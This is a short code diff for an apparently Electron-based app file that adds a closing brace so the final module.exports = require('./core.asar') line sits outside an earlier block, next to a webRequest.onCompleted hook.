@@ -847,4 +847,5 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 break
         }
     })
-    module.exports = require("./core.asar")
+}
+module.exports = require("./core.asar")
